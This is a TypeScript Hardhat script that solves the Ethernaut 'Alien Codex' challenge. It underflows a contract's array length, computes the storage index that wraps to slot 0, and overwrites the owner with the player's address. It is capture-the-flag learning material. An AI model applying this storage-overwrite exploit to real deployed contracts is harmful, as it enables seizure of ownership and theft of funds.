import { AbiCoder } from "@ethersproject/abi";
import { Wallet } from "ethers";
import { ethers } from "hardhat";
import deployAttackMotorbikeEngine from "../deploy/deployAttackMotorbikeEngine";

const attackAlienCodex = async () => {
    // change contract addresses here.
    const alienCodexAddress = "0xF675Be946818f77Ba00aD069C99C97080800656E";
    const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954"; //place your player address here (you may type player in ethernaut console)

    // Don't touch below
    // Exploit comes from no check for underflow on retract function and changing storage value for owner
    // You may read more on:
    // https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/
    // https://docs.soliditylang.org/en/v0.6.0/security-considerations.html#two-s-complement-underflows-overflows
    // https://ethereum.stackexchange.com/questions/63403/in-solidity-how-does-the-slot-assignation-work-for-storage-variables-when-there
    const ABI = [
        "function make_contact()",
        "function retract()",
        "function revise(uint i, bytes32 _content)",
        {
            inputs: [],
            name: "owner",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            stateMutability: "nonpayable",
            type: "function",
        },
    ];
    const contract = await ethers.getContractAt(ABI, alienCodexAddress);
    console.log("Checking current owner");
    let owner = await contract.owner();
    console.log(`Current owner is: ${owner}`);
    console.log("Making contact...");
    const tx1 = await contract.make_contact();
    const tx1Receipt = await tx1.wait(1);
    console.log(tx1Receipt);
    const tx2 = await contract.retract();
    const tx2Receipt = await tx2.wait(1);
    console.log(tx2Receipt);
    // we need to calculate the index where slot for owner is located
    // according to allocation rules, is determined by as keccak256(slot):
    console.log("Now changing the value of owner after calculating its location in storage...");
    const abi = ethers.utils.defaultAbiCoder;
    const params = abi.encode(["uint256"], [1]);
    const position = await ethers.utils.keccak256(params);
    // storage as below
    // Slot        Data
    // ------------------------------
    // 0             owner address, contact bool
    // 1             codex.length
    // Use BigInt for mathematical calculations between very large numbers.
    const i = BigInt(2 ** 256) - BigInt(position);
    const _content = "0x" + "0".repeat(24) + player.slice(2);
    const tx3 = await contract.revise(i, _content);
    const tx3Receipt = await tx3.wait(1);
    console.log(tx3Receipt);
    console.log("Rechecking owner...");
    owner = await contract.owner();
    console.log(`Current owner is: ${owner}`);
    if (owner === player) {
        console.log("Player is now owner!Congrats, Please submit to ethernaut");
    } else {
        console.log(
            "Player is not owner, review code above and try deployAttackMotorbikeEngine..."
        );
    }
};

attackAlienCodex()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
